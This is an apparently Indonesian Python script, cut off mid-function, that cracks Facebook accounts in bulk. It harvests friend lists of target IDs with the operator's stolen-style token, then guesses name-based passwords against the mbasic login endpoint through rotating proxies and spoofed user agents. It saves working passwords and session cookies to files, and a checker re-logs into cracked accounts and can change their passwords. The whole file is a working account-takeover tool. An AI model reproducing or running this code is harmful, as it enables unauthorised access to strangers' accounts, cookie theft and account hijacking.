# code by Resyah16
# my wa business ( https://wa.me/911 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Resyah16.

#Edit bye Resyah16#
#Jangan di Oprek atau di Rikod Tod Anjing#
#ntar data lu ilang kasian ntar Panik ðŸ¤§#
#Mau Maling Akun Orang Mikir Dulu Bang#

#IMPORT-MODULE
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\tâ€¢ Sedang Menginstall Modul Rich â€¢'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\tâ€¢ Sedang Menginstall Modul Stdiomask â€¢'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\tâ€¢ Sedang Menginstall Modul Requests â€¢'))
	os.system('pip install requests && pip install mechanize ')
#USER-AGENT
pretty.install()
CON=sol()
ugen2=['Mozilla/5.0 (Linux; Android 11; V2026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.48 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; Android 11; V2026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.48 Mobile Safari/537.36']
cokbrut=[]
ses=requests.Session()
princp=[]
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
try:
	url_mb = "https://mbasic.facebook.com"
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
ugen=['Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4','Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba; KAKAOTALK 2109200','Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/11.0.026; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/20.0.042; Profile/MIDP-2.1 Configuration/CLDC-1.1; zh-hk) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.2.6.9 3gpp-gba','Mozilla/5.0 (SymbianOS/9.4; Series60/5.3; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/525']
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi Note 5'
	e=random.randrange(100, 9999)
	f='Build/QQ3A.200605.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='X2-HT Build/QP1A.191005.007; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(90,210)
	i='0'
	j=random.randrange(3440,4900)
	k=random.randrange(117,210)
	l='Mobile Safari/537.36 Instagram 184.0.0.30.117 Android (29/10; 480dpi; 1080x1920; HTC/htc; X2-HT; htc_ocla1_sprout;'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(uak)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#BAHAN BAHAN
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#WARNA CODE BY
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	sol()
	ban=''''
 \ \ / /__   __/ ____|
  \ V /   | | | |     
   > <    | | | |     
  / . \   | | | |____ 
 /_/ \_\  |_|  \_____|
                      
                      '''
	cetak(nel(ban, style='blue'))
	
#--------------------[ MASUK ]--------------#
#def login():
#	try:
#		token = open('token.txt','r').read()
#		cok = open('cok.txt','r').read()
#		tokenku.append(token)
#		try:
#			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
#			sy2 = json.loads(sy.text)['name']
#			sy3 = json.loads(sy.text)['id']
#			menu(sy2,sy3)
#		except KeyError:
#			login_lagi334()
#		except requests.exceptions.ConnectionError:
#			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
#			lo = mark(li, style='red')
#			sol().print(lo, style='cyan')
#			exit()
#	except IOError:
		#login_lagi334()
#def login_lagi334():
#	try:
#		os.system('clear')
#		banner()
#		asu = random.choice([m,k,h,b,u])
#		cookie=input(f'Enter Cookies :{H} ')
#		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","ho

#--------------------[ BAGIAN-MASUK ]--------------#

def login():
	try:					
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')	
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		logo()
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}â€¢{x}] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}â€¢{x}]{h} LOGIN BERHASIL TUNNGU SEBNTAR{x} ');time.sleep(1)
		os.system('python tes.py')
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[Ã—] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')


#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(x+'['+h+'â€¢'+x+'] \033[0;34mNama  : '+str(my_name))
	print(x+'['+h+'â€¢'+x+'] \033[0;34mID    : '+str(my_id))
	print(x+'['+h+'â€¢'+x+'] \033[0;34mIP    : '+str(ip))
	#alvino_xy(f'>#> Your Idz : '+str(my_id)
	#alvino_xy(f'>#> Your Ip  : {ip}')
	print('')
	print(x+'\n['+h+'1'+x+'] Crack \x1b[1;92m(ON)') 
	print(x+'['+h+'2'+x+'] Check \x1b[1;92m(ON)') 
	#print(x+'['+h+'3'+x+'] Check Opsi \x1b[1;92m(ON)') 
	print(x+'['+h+'0'+x+'] Logout ')
	_____alvino__adijaya_____ = input(x+'\n['+h+'â€¢'+x+'] Select : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		hasil_crack()
	elif _____alvino__adijaya_____ in ['3']:
		gabut()
	elif _____alvino__adijaya_____ in ['3']:
		gabut()
	#elif _____alvino__adijaya_____ #in #['2']:
		#result()
	#elif _____alvino__adijaya_____ #in #['3']:
		#gabut()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#CRAKING ID TARGET
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(x+'\n['+h+'?'+x+'] Jumlah : '))
	except ValueError:
		print(' Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print(' Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+'>'+x+'] Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print(x+'['+h+'â€¢'+x+'] Total : \x1b[1;92m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f' Pertemanan Tidak Public ')
		time.sleep(3)
		back()
		
def hasil_crack():
	no,nom = 0,[]
	print("")
	one = input("â•°-> 1.Lihat Hasil Crack OK\nâ•°-> 2.Lihat Hasil Crack CP\nâ•°-> 3.Kembali")
	inhasil = input(f"â•°--> Pilih : ")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan("Tidak Ada Hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan("Tidak Ada Hasil")
			time.sleep(2)
			hasil_crack()
		else:
			jalan("Hasil OK")
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					jalan(f"{__oo} {kaoo} {str(len(hikmat))} akun")
				else:
					lol.update({str(cuih):str(kaoo)})
					jalan(f"{cuih} {kaoo} {str(len(hikmat))} akun")
					#kangrecodekontol
			print("Pilih Hasil Untuk Ditmpilkan")
			geeh = input("â•°--> pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print("Pilihan Tidak Ada")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan("File Tidak Ditemukan") 
				time.sleep(2)
				hasil_crack()
			jalan("List Akun OK Kamu\n") 
			#kangrecodekontol
			hus = os.system('cd OK && cat '+geh)
			jalan("List Akun OK Kamu") 
			input("Kembali")
			menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan("Tidak Ada Hasil")
			time.sleep(2)
			hasil_crack()
		if len(c_o_k)==0:
			jalan("Tidak Ada Hasil")
			time.sleep(2)
			hasil_crack()
		else:
			print("Hasil CP")
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					print(f"{__oo} {kaoo} {str(len(hikmat))} akun")
					#print(P+' â€¢'+H+__oo+P+'â€¢ '+kaoo+' â€¢ '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					print(f"{cuih} {kaoo} {str(len(hikmat))} akun")
					#print(P+' â€¢'+H+str(cuih)+P+'â€¢ '+kaoo+' â€¢ '+str(len(hikmat))+' akun'+P)
			print("Pilih Hasil Untuk Ditampilkan")
			geeh = input("â•°--> pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print("Pilihan Tidak Ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan("File Tidak Ditemukan") 
				time.sleep(2)
				hasil_crack()
			print("List Akun CP Kamu\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			print("\n"+"List Akun CP Kamu") 
			input(vars+" kembali")
			menu()
	elif inhasil in ["0","00"]:
		menu()
	else:
		jalan(f"Isi Yang Benar ")
		hasil_crack()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(x+'\n['+h+'1'+x+'] Akun Old \x1b[1;92m(Rekomendasi)')
	print(x+'['+h+'2'+x+'] Akun New  \x1b[1;92m(Rekomendasi)')
	print(x+'['+h+'3'+x+'] Akun Random \x1b[1;92m(Rekomendasi)')
	hu = input(x+'\n['+h+'â€¢'+x+'] Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	if hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
			os.system('clear')
			print('TIDAK KEMBALI KE TAMPILAN PERTAMA ATAU PUN SC NYA LEG TETAPI EMANG GW BUAT GINI SUPAYA EPIC SABAR TUNNGU AJA ')
	else:
		print(' Pilih Yang Bener Kontooll ')
		exit()
	print(x+'\n['+h+'1'+x+'] Mobile.Facebook \x1b[1;92m(Rekomendasi)')
	print(x+'['+h+'2'+x+'] Mbasic.Facebook \x1b[1;92m(Rekomendasi)')
	hc = input(x+'\n['+h+'â€¢'+x+'] Select : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print(' Pilih Yang Bener Kontol ')
		setting()
	elif hc in ['2']:
		print('â†’GW DAH BILANG Mbasic OF KONTOLðŸ˜’')
		setting()
	else:
		method.append('mobile')
	_jembot_ = input(x+'\n['+h+'?'+x+'] Tampilkan Aplikasi ? ')
	_jembot_ = input(x+'\n['+h+'!'+x+'] Masukkan Password Scriptâ†’ ')
	if _jembot_ in ['ya']:
		print('>> pasowrd salah ')
		back()
	elif _jembot_ in ['resyah16','RESYAH16']:
		taplikasi.append('RESYAH')
	else:
		taplikasi.append('no')
		os.system('clear')
#	if _jembot_ in ['']:
#		print('âž¥âž¥âž£Pilih Yang Bener Kontol ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
	pwplus=input(x+'\n['+h+'?'+x+'] Tambahkan Password Manual ? ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		os.system('clear')
		pwku=input(x+'\n['+h+'!'+x+'] Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\n[{h}>{x}] Hasil OK Tersimpan Di : OK/%s {x}'%(okc))
	print(f'[{h}>{x}] Hasil CP Tersimpan Di : CP/%s {x}\n'%(cpc))
	#print(f'[{h}>{x}] Mainkan Mode Pesawat Setiap {m}200{x} ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'21')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(mbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[{h}!{x}] CRACK {h}{P}{b}{loop}{P}/{u}{len(id)}{P} {H}OK:{P}{ok}{P} {k}CP:{P}{cp}{x}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'} 
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}           {P}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ua+'|\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r[{hh}âœ“{P}] email  : {hh}{idf}{P}          \n[{hh}âœ“{P}] sandi  : {hh}{pw}          {P}\n[{hh}âœ“{P}] cookie : {hh}{kuki}{P}\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'|\n')
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
	
def gabut():
    dirs = os.listdir("CP")
    print('\n [ hasil crack yang tersimpan di file anda ]\n')
    for file in dirs:
        print(" [%s+%s] %s"%(O,N,file))
    jalan(f" [{M}Ã—{N}] sebelum memasukan file,hidupkan mode pesawat 3 detik.");time.sleep(5)
    files = input("\n [%s?%s] masukan nama file : %s"%(M,N,H))
    try:
        buka_baju = open(f'CP/{files}','r').readlines()
    except IOError:
        print('\n [!] file tidak ada');time.sleep(2)
    ww=input(f"\n {N}[{O}?{N}] ubah password ketika tap yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" [{H}â€¢{N}] contoh password : {H}Kebersama'n{N}")
        pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print('\n %s[%sÃ—%s] kata sandi minimal 6 karakter'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print('%s [%s*%s] Total %s%s%s Akun'%(N,O,N,K,str(len(buka_baju)),N))
    jalan(" %s[%s#%s] --------------------------------------------"%(N,O,N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [Ã—] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [Ã—] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   [ %sProses Pengecekan Selesai %s]\n'%(H,N))
    jalan(' %s[%sâœ“%s] %sChecking process is complete%s'%(N,H,N,H,N))
    jalan(' %s[%sâœ“%s] Retrun SC type "%spython Kebersaman.py%s"'%(N,H,N,H,N));exit()

# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
